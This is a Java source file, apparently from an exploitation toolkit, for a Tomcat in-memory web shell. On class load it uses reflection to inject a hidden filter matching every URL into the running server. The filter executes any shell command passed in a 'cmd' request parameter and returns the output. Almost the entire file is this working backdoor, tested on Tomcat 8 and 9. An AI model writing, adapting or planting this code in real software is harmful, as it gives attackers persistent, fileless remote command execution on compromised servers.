package xyz.eki.marshalexp.memshell.Tomcat.Filter;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;
/*
Tomcat 8,9 tested
 */
public class TomcatFilterMemshell implements Filter {

    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";

    static {
        try {
            final String name = String.valueOf(System.nanoTime());

            WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            StandardContext standardContext;

            try {
                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            } catch (Exception ignored) {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                Object root   = field.get(webappClassLoaderBase);
                Field  field2 = root.getClass().getDeclaredField("context");
                field2.setAccessible(true);

                standardContext = (StandardContext) field2.get(root);
            }

            Class<? extends StandardContext> aClass = null;
            try {
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                aClass.getDeclaredField("filterConfigs");
            } catch (Exception e) {
                aClass = standardContext.getClass();
                aClass.getDeclaredField("filterConfigs");
            }
            Field Configs = aClass.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            TomcatFilterMemshell behinderFilter = new TomcatFilterMemshell();

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(behinderFilter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(behinderFilter.getClass().getName());

            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(filterUrlPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(name, filterConfig);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    }
}